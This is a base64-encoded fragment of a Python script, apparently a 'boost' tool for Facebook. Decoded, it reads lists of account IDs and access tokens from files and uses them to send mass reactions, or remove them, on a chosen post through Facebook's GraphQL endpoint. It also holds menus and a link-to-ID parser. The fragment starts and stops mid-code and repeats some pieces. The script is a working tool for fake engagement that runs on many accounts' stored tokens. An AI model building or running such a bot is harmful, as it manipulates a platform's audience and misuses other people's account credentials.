KUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgdWlkX3VybCA9IHBvc3RfaWQgIAoKICAgIHByaW50KGYiIiIgICAge3llbGxvd31DaG9vc2UgdGhlIHJlYWN0aW9uIHR5cGU6CiAgICAge2JsdWV9WzFdIHtncmVlbn1MSUtFCiAgICAge2JsdWV9WzJdIHtncmVlbn1MT1ZFCiAgICAge2JsdWV9WzNdIHtncmVlbn1XT1cKICAgICB7Ymx1ZX1bNF0ge2dyZWVufVNBRAogICAgIHtibHVlfVs1XSB7Z3JlZW59QU5HUlkKICAgICB7Ymx1ZX1bNl0ge2dyZWVufUhBSEEKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICAKICAgIHRyeToKICAgICAgICByZWFjdGlvbl9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAgIHtncmVlbn1DaG9vc2U6ICIpKQogICAgICAgIHJlYWN0aW9uX21hcCA9IHsKICAgICAgICAgICAgMTogIkxJS0UiLAogICAgICAgICAgICAyOiAiTE9WRSIsCiAgICAgICAgICAgIDM6ICJXT1ciLAogICAgICAgICAgICA0OiAiU0FEIiwKICAgICAgICAgICAgNTogIkFOR1JZIiwKICAgICAgICAgICAgNjogIkhBSEEiCiAgICAgICAgfQogICAgICAgIHJlYWN0aW9uX3R5cGUgPSByZWFjdGlvbl9tYXAuZ2V0KHJlYWN0aW9uX2Nob2ljZSwgTm9uZSkKICAgICAgICBpZiByZWFjdGlvbl90eXBlIGlzIE5vbmU6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIHJlYWN0aW9uIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIAogICAgdHJ5OgogICAgICAgIG51bV9yZWFjdGlvbnMgPSBpbnQoaW5wdXQoZiIgICAgIHt5ZWxsb3d9RW50ZXIgdGhlIG51bWJlciBvZiByZWFjdGlvbnM6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBmb3IgcmVhY3Rpb25zLiIpCiAgICAgICAgcmV0dXJuCgogICAgbWF4X3dvcmtlcnMgPSAxMCAgIyBTZXQgYSBsaW1pdCBmb3IgdGhlIG51bWJlciBvZiBjb25jdXJyZW50IHRocmVhZHMKICAgIHJlYWN0aW9uc19jb3VudCA9IDAgICMgQ291bnRlciBmb3Igc3VjY2Vzc2Z1bCByZWFjdGlvbnMKICAgIHRvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zID0gMAogICAgcmVzdWx0cyA9IFtdICAjIFN0b3JlIHJlc3VsdHMgZm9yIGZ1cnRoZXIgcHJvY2Vzc2luZwoKICAgIHRva2Vuc191c2VkID0gMCAgIyBUcmFjayB0aGUgdG90YWwgbnVtYmVyIG9mIHRva2VucyB1c2VkCiAgICAKICAgICMgS2VlcCBwcm9jZXNzaW5nIHRva2VucyB1bnRpbCB3ZSByZWFjaCB0aGUgc3VjY2Vzc2Z1bCByZWFjdGlvbiBsaW1pdAogICAgd2hpbGUgdG90YWxfc3VjY2Vzc2Z1bF9yZWFjdGlvbnMgPCBudW1fcmVhY3Rpb25zIGFuZCB0b2tlbnNfdXNlZCA8IGF2YWlsYWJsZV90b2tlbnM6CiAgICAgICAgcmVtYWluaW5nX3Rva2VucyA9IHRva2Vuc1t0b2tlbnNfdXNlZDpdICAjIEdldCB0aGUgcmVtYWluaW5nIHRva2VucwogICAgICAgIHRva2Vuc19iYXRjaCA9IHJlbWFpbmluZ190b2tlbnNbOm51bV9yZWFjdGlvbnMgLSB0b3RhbF9zdWNjZXNzZnVsX3JlYWN0aW9uc10gICMgR2V0IG9ubHkgdGhlIG5lZWRlZCB0b2tlbnMKICAgICAgICAKICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1tYXhfd29ya2VycykgYXMgZXhlY3V0b3I6CiAgICAgICAgICAgIGZ1dHVyZV90b190b2tlbiA9IHtleGVjdXRvci5zdWJtaXQocGVyZm9ybV9yZWFjdGlvbiwgdG9rZW4sIHVpZF91cmwsIHJlYWN0aW9uX3R5cGUpOiB0b2tlbiBmb3IgdG9rZW4gaW4gdG9rZW5zX2JhdGNofQoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBhc19jb21wbGV0ZWQoZnV0dXJlX3RvX3Rva2VuKToKICAgICAgICAgICAgICAgIHRva2VuID0gZnV0dXJlX3RvX3Rva2VuW2Z1dHVyZV0KICAgICAgICAgICAgICAgIHVpZCA9IHRva2VuLnNwbGl0KCd8JylbMF0KICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4sIHN0YXR1c19jb2RlLCByZXNwb25zZV90ZXh0ID0gZnV0dXJlLnJlc3VsdCgpCiAgICAgICAgICAgICAgICAgICAgaWYgc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZWFjdGlvbnNfY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9zdWNjZXNzZnVsX3JlYWN0aW9ucyArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgICAge3JlZH1bUkVBQ1RPUl0ge3llbGxvd317dWlkfSAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSAPiB7Z3JlZW59U1VDQ0VTU0ZVTExZIFJFQUNURUQhIikKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJFcnJvciBwcm9jZXNzaW5nIHRva2VuIHt0b2tlbn06IHtlfSIpCiAgICAgICAgCiAgICAgICAgdG9rZW5zX3VzZWQgKz0gbGVuKHRva2Vuc19iYXRjaCkgICMgVXBkYXRlIHRoZSB0b3RhbCB0b2tlbnMgdXNlZAogICAgICAgIAogICAgICAgICMgQnJlYWsgaWYgd2UgcnVuIG91dCBvZiB0b2tlbnMKICAgICAgICBpZiB0b2tlbnNfdXNlZCA+PSBhdmFpbGFibGVfdG9rZW5zOgogICAgICAgICAgICBwcmludCgiTm8gbW9yZSB0b2tlbnMgYXZhaWxhYmxlLiIpCiAgICAgICAgICAgIGJyZWFrCgogICAgcHJpbnQoZiJ7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYie2dyZWVufVRPVEFMIFNVQ0NFU1NGVUwgUkVBQ1RJT05TOiB7dG90YWxfc3VjY2Vzc2Z1bF9yZWFjdGlvbnN9IikKCmltcG9ydCByZXF1ZXN0cwppbXBvcnQganNvbgppbXBvcnQgdGltZQppbXBvcnQgdXVpZAppbXBvcnQgYmFzZTY0CmltcG9ydCByZQoKZGVmIEF1dG9SZWFjdCgpOgogICAgZGVmIFJlYWN0aW9uKGFjdG9yX2lkOiBzdHIsIHBvc3RfaWQ6IHN0ciwgcmVhY3Q6IHN0ciwgdG9rZW46IHN0cik6CiAgICAgICAgcnVpID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgZmVlZGJhY2tfaWQgPSBzdHIoYmFzZTY0LmI2NGVuY29kZSgoJ2ZlZWRiYWNrOnt9Jy5mb3JtYXQocG9zdF9pZCkpLmVuY29kZSgndXRmLTgnKSkuZGVjb2RlKCd1dGYtOCcpKQogICAgICAgIHZhciA9IHsKICAgICAgICAgICAgImlucHV0IjogewogICAgICAgICAgICAgICAgImZlZWRiYWNrX3JlZmVycmVyIjogIm5hdGl2ZV9uZXdzZmVlZCIsCiAgICAgICAgICAgICAgICAidHJhY2tpbmciOiBbTm9uZV0sCiAgICAgICAgICAgICAgICAiZmVlZGJhY2tfaWQiOiBmZWVkYmFja19pZCwKICAgICAgICAgICAgICAgICJjbGllbnRfbXV0YXRpb25faWQiOiBzdHIodXVpZC51dWlkNCgpKSwKICAgICAgICAgICAgICAgICJuZWN0YXJfbW9kdWxlIjogIm5ld3NmZWVkX3VmaSIsCiAgICAgICAgICAgICAgICAiZmVlZGJhY2tfc291cmNlIjogIm5hdGl2ZV9uZXdzZmVlZCIsCiAgICAgICAgICAgICAgICAiZmVlZGJhY2tfcmVhY3Rpb25faWQiOiByZWFjdCwKICAgICAgICAgICAgICAgICJhY3Rvcl9pZCI6IGFjdG9yX2lkLAogICAgICAgICAgICAgICAgImFjdGlvbl90aW1lc3RhbXAiOiBzdHIodGltZS50aW1lKCkpWzoxMF0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBkYXRhID0gewogICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogdG9rZW4sCiAgICAgICAgICAgICdtZXRob2QnOiAncG9zdCcsCiAgICAgICAgICAgICdwcmV0dHknOiBGYWxzZSwKICAgICAgICAgICAgJ2Zvcm1hdCc6ICdqc29uJywKICAgICAgICAgICAgJ3NlcnZlcl90aW1lc3RhbXBzJzogVHJ1ZSwKICAgICAgICAgICAgJ2xvY2FsZSc6ICdpZF9JRCcsCiAgICAgICAgICAgICdmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUnOiAnVmlld2VyUmVhY3Rpb25zTXV0YXRpb24nLAogICAgICAgICAgICAnZmJfYXBpX2NhbGxlcl9jbGFzcyc6ICdncmFwaHNlcnZpY2UnLAogICAgICAgICAgICAnY2xpZW50X2RvY19pZCc6ICcyODU3Nzg0MDkzNTE4MjA1Nzg1MTE1MjU1Njk3JywKICAgICAgICAgICAgJ3ZhcmlhYmxlcyc6IGpzb24uZHVtcHModmFyKSwKICAgICAgICAgICAgJ2ZiX2FwaV9hbmFseXRpY3NfdGFncyc6IFsiR3JhcGhTZXJ2aWNlcyJdLAogICAgICAgICAgICAnY2xpZW50X3RyYWNlX2lkJzogc3RyKHV1aWQudXVpZDQoKSkKICAgICAgICB9CgogICAgICAgIHBvcyA9IHJ1aS5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncmFwaHFsJywgZGF0YT1kYXRhKS5qc29uKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIHJlYWN0ID09ICcwJzoKICAgICAgICAgICAgICAgIHByaW50KGYie2JsdWV944CMU3VjY2Vzc+OAjcK7IHtyZWR9UmVtb3ZlZCByZWFjdGlvbiBmcm9tIHthY3Rvcl9pZH0gb24ge3Bvc3RfaWR9IikKICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgICAgIGVsaWYgcmVhY3QgaW4gc3RyKHBvcyk6CiAgICAgICAgICAgICAgICBwcmludChmIntibHVlfeOAjFN1Y2Nlc3PjgI3CuyB7cmVkfSBSZWFjdGVkIHdpdGggwrsge2FjdG9yX2lkfSB0byB7cG9zdF9pZH0iKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH3jgIxGYWlsZWTjgI3CuyBSZWFjdGVkIHdpdGggwrsge2FjdG9yX2lkfSB0byB7cG9zdF9pZH0iKQogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcHJpbnQoJ1JlYWN0aW9uIGZhaWxlZCBkdWUgdG8gYW4gZXJyb3IuJykKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgZGVmIGxpbmt0cmFkaW8ocG9zdF9saW5rOiBzdHIpIC0+IHN0cjoKICAgICAgICAjIEV4dHJhY3QgcG9zdCBJRCBmcm9tIHZhcmlvdXMgRmFjZWJvb2sgVVJMcwogICAgICAgIHBhdHRlcm5zID0gWwogICAgICAgICAgICByJy9wb3N0cy8oXHcrKScsICAgICAgICAgICMgUmVndWxhciBwb3N0CiAgICAgICAgICAgIHInL3ZpZGVvcy8oXHcrKScsICAgICAgICAgIyBWaWRlbyBwb3N0CiAgICAgICAgICAgIHInL2dyb3Vwcy8oXGQrKS9wZXJtYWxpbmsvKFxkKyknLCAgIyBHcm91cCBwZXJtYWxpbmsgcG9zdAogICAgICAgICAgICByJy9yZWVscy8oXHcrKScsICAgICAgICAgICMgUmVlbHMKICAgICAgICAgICAgcicvbGl2ZS8oXHcrKScsICAgICAgICAgICAjIExpdmUgdmlkZW9zCiAgICAgICAgICAgIHInL3Bob3Rvcy8oXHcrKScsICAgICAgICAgIyBQaG90byBwb3N0cwogICAgICAgICAgICByJy9wZXJtYWxpbmsvKFx3KyknLCAgICAgICMgUGVybWFsaW5rIHBvc3RzCiAgICAgICAgICAgIHInc3RvcnlfZmJpZD0oXHcrKScsICAgICAgIyBTdG9yeSBwb3N0cwogICAgICAgICAgICByJ2ZiaWQ9KFxkKyknICAgICAgICAgICAgICMgUGhvdG8gcG9zdCAobmV3IHBhdHRlcm4gZm9yIHBob3RvIGxpbmtzKQogICAgICAgIF0KICAgICAgICAKICAgICAgICBmb3IgcGF0dGVybiBpbiBwYXR0ZXJuczoKICAgICAgICAgICAgbWF0Y2ggPSByZS5zZWFyY2gocGF0dGVybiwgcG9zdF9saW5rKQogICAgICAgICAgICBpZiBtYXRjaDoKICAgICAgICAgICAgICAgICMgUmV0dXJuIHRoZSBncm91cCBJRCBhbmQgcG9zdCBJRCBmb3IgZ3JvdXAgcGVybWFsaW5rIHBvc3RzCiAgICAgICAgICAgICAgICBpZiBwYXR0ZXJuID09IHInL2dyb3Vwcy8oXGQrKS9wZXJtYWxpbmsvKFxkKyknOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaC5ncm91cCgyKQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoLmdyb3VwKDEpCiAgICAgICAgCiAgICAgICAgcHJpbnQoIkludmFsaWQgcG9zdCBsaW5rIG9yIGZvcm1hdCIpCiAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBkZWYgZ2V0X2lkc190b2tlbnMoZmlsZV9wYXRoKToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGRhdGEgPSBbbGluZS5zdHJpcCgpLnNwbGl0KCd8JykgZm9yIGxpbmUgaW4gZmlsZV0KICAgICAgICByZXR1cm4gZGF0YQoKICAgIGRlZiBjaG9vc2VfcmVhY3Rpb24oKToKICAgICAgICAKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludChmIiIiICAgIHt5ZWxsb3d9Q2hvb3NlIHRoZSByZWFjdGlvbiB0eXBlOgogICAgIHtibHVlfVsxXSB7Z3JlZW59TElLRQogICAgIHtibHVlfVsyXSB7Z3JlZW59TE9WRQogICAgIHtibHVlfVszXSB7Z3JlZW59SEFIQQogICAgIHtibHVlfVs0XSB7Z3JlZW59V09XCiAgICAge2JsdWV9WzVdIHtncmVlbn1DQVJFCiAgICAge2JsdWV9WzZdIHtncmVlbn1TQUQKICAgICB7Ymx1ZX1bN10ge2dyZWVufUFOR1JZCiAgICAge3JlZH1bOF0ge3JlZH1SRU1PVkUgUkVBQ1RJT04KICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICAgICAgCiAgICAgICAgcmVjID0gaW5wdXQoZicge3llbGxvd31DaG9vc2UgYSByZWFjdGlvbjogJykKICAgICAgICByZWFjdGlvbl9pZHMgPSB7CiAgICAgICAgICAgICcxJzogJzE2MzU4NTU0ODY2NjY5OTknLCAgIyBMaWtlCiAgICAgICAgICAgICcyJzogJzE2Nzg1MjQ5MzI0MzQxMDInLCAgIyBMb3ZlCiAgICAgICAgICAgICczJzogJzExNTk0MDY1ODc2NDk2MycsICAgIyBIYWhhCiAgICAgICAgICAgICc0JzogJzQ3ODU0NzMxNTY1MDE0NCcsICAgIyBXb3cKICAgICAgICAgICAgJzUnOiAnNjEzNTU3NDIyNTI3ODU4JywgICAjIENhcmUKICAgICAgICAgICAgJzYnOiAnOTA4NTYzNDU5MjM2NDY2JywgICAjIFNhZAogICAgICAgICAgICAnNyc6ICc0NDQ4MTMzNDIzOTIxMzcnLCAgICMgQW5ncnkKICAgICAgICAgICAgJzgnOiAnMCcgICAgICAgICAgICAgICAgICAjIFJlbW92ZSBSZWFjdGlvbgogICAgICAgIH0KICAgICAgICByZXR1cm4gcmVhY3Rpb25faWRzLmdldChyZWMpCgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgIHt3aGl0ZX1DSE9PU0UgVFlQRSBPRiBSRUFDVE9SUzogCiAgICAge2JsdWV9WzFdIHtncmVlbn1GUkEgQUNDT1VOVCAKICAgICB7Ymx1ZX1bMl0ge2dyZWVufUZSQSBQQUdFUwogICAgIHtibHVlfVszXSB7Z3JlZW59UlBXIEFDQ09VTlQKICAgICB7Ymx1ZX1bNF0ge2dyZWVufVJQVyBQQUdFUwogICAgIHtyZWR9WzBdICB7cmVkfSBFWElUIAogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikKICAgIGZpbGVfb3B0aW9ucyA9IHsKICAgICAgICAxOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0IiwKICAgICAgICAyOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAgICAgMzogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCIsCiAgICAgICAgNDogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQiCiAgICB9CiAgICAKICAgIAogICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAge3llbGxvd31DaG9vc2U6ICIpKQogICAgZmlsZV9wYXRoID0gZmlsZV9vcHRpb25zLmdldChmaWxlX2Nob2ljZSkKCiAgICAjIFN0ZXAgMjogQ291bnQgdG9rZW5zIGluIHRoZSBzZWxlY3RlZCBmaWxlCiAgICB0b2tlbnNfZGF0YSA9IGdldF9pZHNfdG9rZW5zKGZpbGVfcGF0aCkKICAgIHRvdGFsX3Rva2VucyA9IGxlbih0b2tlbnNfZGF0YSkKICAgICMgU3RlcCAzOiBBc2sgZm9yIHN0YXJ0aW5nIGxpbmUKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgc3RhcnRfbGluZSA9IGludChpbnB1dCgiICAgXDAzM1szODs1OzgxbUVudGVyIHRoZSBzdGFydGluZyBsaW5lIChZb3UgY3VycmVudGx5IGhhdmUge30pOiAiLmZvcm1hdCh0b3RhbF90b2tlbnMpKSkKCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHBvc3RfbGluayA9IGlucHV0KGYnICAge3llbGxvd31FbnRlciBMaW5rOiAnKQogICAgcG9zdF9pZCA9IGdldF9jb21iaW5lZF9kYXRhKHBvc3RfbGluaykKCiAgICBpZiBub3QgcG9zdF9pZDoKICAgICAgICByZXR1cm4KICAgIAogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICByZWFjdF9jb3VudCA9IGludChpbnB1dChmIiAgICAge3llbGxvd31FbnRlciBMaW1pdCh1cCB0byB7dG90YWxfdG9rZW5zIC0gKHN0YXJ0X2xpbmUgLSAxKX0pOiAiKSkKICAgIAogICAgIyBTdGVwIDY6IENob29zZSByZWFjdGlvbiB0eXBlCiAgICByZWFjdCA9IGNob29zZV9yZWFjdGlvbigpCiAgICAKICAgIGlmIHJlYWN0ID09ICcwJzogICMgVW5yZWFjdAogICAgICAgIHJlbW92ZV9jb3VudCA9IG1pbihyZWFjdF9jb3VudCwgdG90YWxfdG9rZW5zIC0gKHN0YXJ0X2xpbmUgLSAxKSkKICAgICAgICByZWFjdGlvbnNfcmVtb3ZlZCA9IDAKICAgICAgICBmb3IgYWN0b3JfaWQsIHRva2VuIGluIHRva2Vuc19kYXRhW3N0YXJ0X2xpbmUgLSAxOnN0YXJ0X2xpbmUgLSAxICsgcmVtb3ZlX2NvdW50XToKICAgICAgICAgICAgc3VjY2VzcyA9IFJlYWN0aW9uKGFjdG9yX2lkPWFjdG9yX2lkLCBwb3N0X2lkPXBvc3RfaWQsIHJlYWN0PScwJywgdG9rZW49dG9rZW4pCiAgICAgICAgICAgIGlmIHN1Y2Nlc3M6CiAgICAgICAgICAgICAgICByZWFjdGlvbnNfcmVtb3ZlZCArPSAxCiAgICAgICAgcHJpbnQoZiJBbGwge3JlYWN0aW9uc19yZW1vdmVkfSByZWFjdGlvbnMgaGF2ZSBiZWVuIHN1Y2Nlc3NmdWxseSByZW1vdmVkISBZb3UncmUgYXdlc29tZSEiKQogICAgZWxpZiByZWFjdDogICMgUmVhY3QKICAgICAgICBzZW5kX2NvdW50ID0gbWluKHJlYWN0X2NvdW50LCB0b3RhbF90b2tlbnMgLSAoc3RhcnRfbGluZSAtIDEpKQogICAgICAgIHJlYWN0aW9uc19zZW50ID0gMAogICAgICAgIGZvciBhY3Rvcl9pZCwgdG9rZW4gaW4gdG9rZW5zX2RhdGFbc3RhcnRfbGluZSAtIDE6c3RhcnRfbGluZSAtIDEgKyBzZW5kX2NvdW50XToKICAgICAgICAgICAgc3VjY2VzcyA9IFJlYWN0aW9uKGFjdG9yX2lkPWFjdG9yX2lkLCBwb3N0X2lkPXBvc3RfaWQsIHJlYWN0PXJlYWN0LCB0b2tlbj10b2tlbikKICAgICAgICAgICAgaWYgc3VjY2VzczoKICAgICAgICAgICAgICAgIHJlYWN0aW9uc19zZW50ICs9IDEKICAgICAgICBwcmludChmIkFsbCB7cmVhY3Rpb25zX3NlbnR9IHJlYWN0aW9ucyBoYXZlIGJlZW4gc3VjY2Vzc2Z1bGx5IHNlbnQhIFlvdSdyZSBhd2Vzb21lISIpCiAgICBlbHNlOgogICAgICAgIHByaW50KCdJbnZhbGlkIHJlYWN0aW9uIG9wdGlvbi4nKQoKIyBDYWxsIEF1dG9SZWFjdCB0byBydW4gdGhlIHByb2dyYW0KCgojIENhbGwgQXV0b1JlYWN0IHRvIHJ1biB0aGUgcHJvZ3JhbQoKCgojIFRvIHJ1biB0aGUgQXV0b1JlYWN0IGZ1bmN0aW9uOgoKCgojIFJ1biB0aGUgQXV0b1JlYWN0IHNjcmlwdAoKCgoKCgoKaW1wb3J0IHJlCgpkZWYgZXh0cmFjdF9yZWVsX2lkKGxpbmspOgogICAgIiIiCiAgICBFeHRyYWN0IHRoZSByZWVsIElEIGZyb20gdGhlIHByb3ZpZGVkIEZhY2Vib29rIHJlZWwgbGluay4KICAgIEV4YW1wbGU6IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9yZWVsLzEwMjA4NjQ4MTIyODYxMTI/bWliZXh0aWQ9clM0MGFCN1M5VWNieHc2dgogICAgc2hvdWxkIHJldHVybiAnMTAyMDg2NDgxMjI4NjExMicKICAgICIiIgogICAgIyBEZWZpbmUgdGhlIHJlZ3VsYXIgZXhwcmVzc2lvbiBwYXR0ZXJuIHRvIG1hdGNoIHRoZSByZWVsIElECiAgICBwYXR0ZXJuID0gcicvcmVlbC8oXGQrKScgICMgTG9va3MgZm9yICcvcmVlbC8nIGZvbGxvd2VkIGJ5IGRpZ2l0cwogICAgCiAgICAjIFNlYXJjaCBmb3IgdGhlIHBhdHRlcm4gaW4gdGhlIGxpbmsKICAgIG1hdGNoID0gcmUuc2VhcmNoKHBhdHRlcm4sIGxpbmspCiAgICAKICAgIGlmIG1hdGNoOgogICAgICAgICMgSWYgdGhlIHBhdHRlcm4gbWF0Y2hlcywgcmV0dXJuIHRoZSByZWVsIElEICh0aGUgZGlnaXRzIGFmdGVyICcvcmVlbC8nKQogICAgICAgIHJldHVybiBtYXRjaC5ncm91cCgxKQogICAgZWxzZToKICAgICAgICAjIFJldHVybiBOb25lIGlmIG5vI